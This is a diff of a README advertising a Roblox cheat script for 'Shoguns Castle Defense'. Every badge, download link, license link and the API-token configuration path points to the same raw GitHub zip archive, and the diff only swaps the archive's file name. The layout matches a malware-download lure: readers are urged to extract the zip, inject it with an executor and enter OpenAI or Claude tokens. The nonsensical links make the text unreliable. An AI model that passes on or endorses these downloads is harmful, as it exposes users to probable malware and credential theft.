@@ -2,9 +2,9 @@
 
 Welcome, fortress architects and digital strategists! This repository presents the **Shoguns Castle Defense roblox script**—an artisanal codework crafted for the connoisseur of tower defense universes. Elevate your *Roblox* experience with smart automation, adaptive UI, and a treasure chest of modern integrations. This isn’t just a script; it’s your toolkit for dominion, empowerment, and “click-smart” efficiency.
 
-[![Maintenance](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip)](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip)
-[![Roblox Compatible](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip)](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip)
-[![Support](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip%2F7-yellowgreen)]()
+[![Maintenance](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip)](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip)
+[![Roblox Compatible](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip)](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip)
+[![Support](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip%2F7-yellowgreen)]()
 
 ---
 
@@ -73,14 +73,14 @@ No time zone can defeat us. With round-the-clock support, our response is swifte
 
 Ready to unveil your captain’s banner? Secure the script now:
 
-**Download Link:** https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip  
-[![Download](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip)](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip)
+**Download Link:** https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip  
+[![Download](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip)](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip)
 
 ### Installation Steps
 
 1. **Download** the script via the link above.
 2. **Extract** the provided zip file to your preferred game scripting directory.
-3. **Configure** OpenAI or Claude API tokens in `https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip` for full AI-enabled features.
+3. **Configure** OpenAI or Claude API tokens in `https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip` for full AI-enabled features.
 4. **Launch** Roblox Studio, open “Shoguns Castle Defense”, and **inject** the script through your compatible executor.
 5. Access the **UI** dashboard in-game (press `F3`).
 
@@ -118,7 +118,7 @@ Detailed installation, troubleshooting, and user guides are provided in `/docs`.
 
 ## 📜 License
 
-This project is released under the [MIT License](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip) (c) 2025.
+This project is released under the [MIT License](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip) (c) 2025.
 
 ---
 
@@ -126,8 +126,8 @@ This project is released under the [MIT License](https://raw.githubusercontent.c
 
 Download or update to energize your scripting journey:
 
-**Download Script:** https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip  
-[![Download](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip)](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/shoguns-castle-defense-toolkit-v1.0.zip)
+**Download Script:** https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip  
+[![Download](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip)](https://raw.githubusercontent.com/Sdhellerman/shoguns-castle-defense-toolkit/branch/androgynal/toolkit-castle-shoguns-defense-3.6.zip)
 
 ---
 
